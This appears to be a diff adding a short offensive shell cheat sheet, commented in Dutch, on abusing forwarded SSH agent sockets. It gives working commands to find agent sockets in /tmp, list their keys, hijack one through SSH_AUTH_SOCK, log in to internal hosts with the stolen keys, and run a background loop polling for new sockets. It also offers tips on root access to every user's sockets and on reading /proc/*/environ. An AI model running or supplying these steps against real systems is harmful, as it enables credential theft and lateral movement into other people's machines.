@@ -1,0 +1,17 @@
+# SSH Agent Forwarding Abuse - Gestolen agent sockets hergebruiken
+# Stap 1: Zoek forwarded SSH agent sockets
+find /tmp -type s -name 'agent.*' 2>/dev/null
+ls -la /tmp/ssh-*/agent.*
+# Stap 2: Check welke keys geladen zijn in gevonden agents
+for sock in /tmp/ssh-*/agent.*; do SSH_AUTH_SOCK=$sock ssh-add -l 2>/dev/null && echo "^^ Found in: $sock"; done
+# Stap 3: Gebruik gevonden agent socket
+export SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.12345
+ssh-add -l
+# Stap 4: SSH naar andere hosts met gestolen keys
+ssh user@internal-target
+ssh user@other-server
+# Stap 5: Permanent agent hijacking (achtergrond monitoring)
+while true; do for sock in /tmp/ssh-*/agent.*; do SSH_AUTH_SOCK=$sock ssh-add -l 2>/dev/null; done; sleep 60; done &
+# Tip: Agent forwarding is alleen actief zolang de originele sessie open is
+# Tip: Als root kun je ALLE user agent sockets benaderen
+# Tip: Controleer /proc/*/environ voor SSH_AUTH_SOCK variabelen
